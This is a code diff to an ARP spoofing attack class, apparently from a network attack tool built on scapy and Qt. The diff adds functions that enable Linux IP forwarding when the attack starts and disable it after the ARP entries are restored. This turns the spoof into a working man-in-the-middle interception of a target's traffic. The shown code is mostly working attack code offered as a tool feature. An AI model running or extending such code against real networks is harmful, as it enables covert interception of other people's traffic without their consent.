@@ -47,8 +47,20 @@ class SofiaArpSpoofAttack(QObject):
 		self.append_log("[ARP] Restoring IP addresses ...")
 		scapy.send(scapy.ARP(op = 2, pdst=self.g_gateway_ip, hwdst=self.gw_mac, psrc=self.g_target_ip, hwsrc=self.target_mac), verbose=False)
 		scapy.send(scapy.ARP(op = 2, pdst=self.g_target_ip, hwdst=self.target_mac, psrc=self.g_gateway_ip, hwsrc=self.gw_mac), verbose=False)
+		self.disable_ip_forward()
+
+	def enable_ip_forward(self):
+		import os
+		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+
+	def disable_ip_forward(self):
+		import os
+		os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
 
 	def run(self):
+
+		self.enable_ip_forward()
+
 		self.append_log(f"[ARP] Starting the attack: loop={self.loop}")
 		self.gw_mac = self.get_mac(self.g_gateway_ip)
 		self.target_mac = self.get_mac(self.g_target_ip)
